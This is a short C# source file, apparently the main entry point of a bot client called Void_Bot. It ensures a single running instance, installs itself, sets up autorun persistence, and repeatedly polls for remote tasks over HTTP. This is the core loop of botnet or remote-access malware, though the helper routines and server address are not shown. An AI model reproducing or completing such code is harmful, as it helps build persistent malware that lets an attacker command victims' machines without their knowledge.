using System.Threading;
using Void_Bot.Core;

namespace Void_Bot;

internal class Void_Bot
{
	public static void Main()
	{
		Functions.CheckMutex();
		if (!Installation.IsInstalled())
		{
			Installation.Start();
		}
		Installation.PrepareAutoRun();
		while (true)
		{
			new Thread(HTTP.RequestAndParseTasks).Start();
			Thread.Sleep(Config.Config_MainThreadInterval * 60000);
		}
	}
}
